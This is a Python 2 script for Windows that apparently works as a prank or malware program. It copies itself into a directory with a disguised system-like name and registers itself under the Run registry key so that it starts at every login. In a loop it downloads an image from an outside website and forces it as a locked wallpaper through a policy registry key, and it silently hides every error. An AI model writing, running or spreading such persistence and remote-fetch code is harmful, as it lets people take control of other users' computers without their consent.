import sys
import os 
import shutil
from _winreg import *
import urllib
from time import sleep

location="C:\\Windows Files\\system 32\\drivers\\etc\\files\\host\\"

def replicate():
	directory_name= r"C:\Windows Files\system 32\drivers\etc\files\host"
	file_name= sys.argv[0]
	
	if not os.path.exists(directory_name):
		os.makedirs(directory_name)

	temp=file_name.split("/")
	name="\\".join(temp)
	print name,directory_name
	shutil.copy2(name,directory_name)




def startupEntry():
	keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

	key2change = OpenKey(HKEY_CURRENT_USER,
	keyVal,0,KEY_ALL_ACCESS)

	temp = sys.argv[0]
	name = temp.split("\\")[-1]
	SetValueEx(key2change, "File",0,REG_SZ, location+name)


def retreivePic():
	urllib.urlretrieve ("http://attitudesinghrajput.site90.com/image.jpg", location+"image.jpg")
	picName=location+"image.jpg"
	return picName


def fixIt(picName):
	#keyVal= r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
	key2change= OpenKey(HKEY_CURRENT_USER,
	"Software\Microsoft\Windows\CurrentVersion\Policies",0,KEY_ALL_ACCESS)
	CreateKey(key2change,"System")

	key2change = OpenKey(HKEY_CURRENT_USER,
	"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, KEY_ALL_ACCESS)
	SetValueEx(key2change, "Wallpaper", 0, REG_SZ, picName)
	SetValueEx(key2change, "WallpaperStyle", 0, REG_SZ, "0")



def main():
	try:
		replicate()
		# print "replicate done"
		startupEntry()
		# print "startup entry done"
	except:
		pass
	while True:
		try:
			picName=retreivePic()
			fixIt(picName)
			sleep(3600)
		except:
			sleep(120)



if __name__== "__main__":
	main()